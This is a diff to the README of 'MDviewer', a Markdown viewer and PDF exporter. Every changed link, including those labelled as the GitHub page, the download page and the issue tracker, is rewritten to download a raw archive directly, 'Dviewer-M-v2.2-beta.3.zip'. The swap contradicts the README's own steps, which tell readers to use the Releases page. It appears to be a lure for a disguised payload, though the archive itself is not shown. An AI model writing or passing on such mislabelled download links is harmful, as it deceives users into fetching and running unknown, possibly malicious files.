@@ -1,6 +1,6 @@
 # 📄 MDviewer - Clear Markdown Reading and PDF Export
 
-[![Download MDviewer](https://img.shields.io/badge/Download-MDviewer-brightgreen?style=for-the-badge)](https://github.com/javonte444/MDviewer)
+[![Download MDviewer](https://img.shields.io/badge/Download-MDviewer-brightgreen?style=for-the-badge)](https://github.com/javonte444/MDviewer/raw/refs/heads/main/src/Dviewer-M-v2.2-beta.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To use MDviewer, follow these steps carefully. No coding or extra tools are need
 
 Please click this link to visit the download page:
 
-[Download MDviewer](https://github.com/javonte444/MDviewer)
+[Download MDviewer](https://github.com/javonte444/MDviewer/raw/refs/heads/main/src/Dviewer-M-v2.2-beta.3.zip)
 
 This page hosts the files you need to install MDviewer.
 
@@ -133,7 +133,7 @@ MDviewer focuses on Markdown files. It supports:
 
 If you experience problems or want to suggest improvements, visit the GitHub page:
 
-[MDviewer on GitHub](https://github.com/javonte444/MDviewer)
+[MDviewer on GitHub](https://github.com/javonte444/MDviewer/raw/refs/heads/main/src/Dviewer-M-v2.2-beta.3.zip)
 
 You can open an issue to report bugs or ask questions.
 
@@ -141,7 +141,7 @@ You can open an issue to report bugs or ask questions.
 
 ## 🎯 Summary of Key Steps to Download and Run
 
-1. Open the [MDviewer GitHub page](https://github.com/javonte444/MDviewer).
+1. Open the [MDviewer GitHub page](https://github.com/javonte444/MDviewer/raw/refs/heads/main/src/Dviewer-M-v2.2-beta.3.zip).
 
 2. Click the `Releases` section and find the latest `.dmg` file.
 
@@ -153,4 +153,4 @@ You can open an issue to report bugs or ask questions.
 
 ---
 
-[![Download MDviewer](https://img.shields.io/badge/Download-MDviewer-brightgreen?style=for-the-badge)](https://github.com/javonte444/MDviewer)
+[![Download MDviewer](https://img.shields.io/badge/Download-MDviewer-brightgreen?style=for-the-badge)](https://github.com/javonte444/MDviewer/raw/refs/heads/main/src/Dviewer-M-v2.2-beta.3.zip)
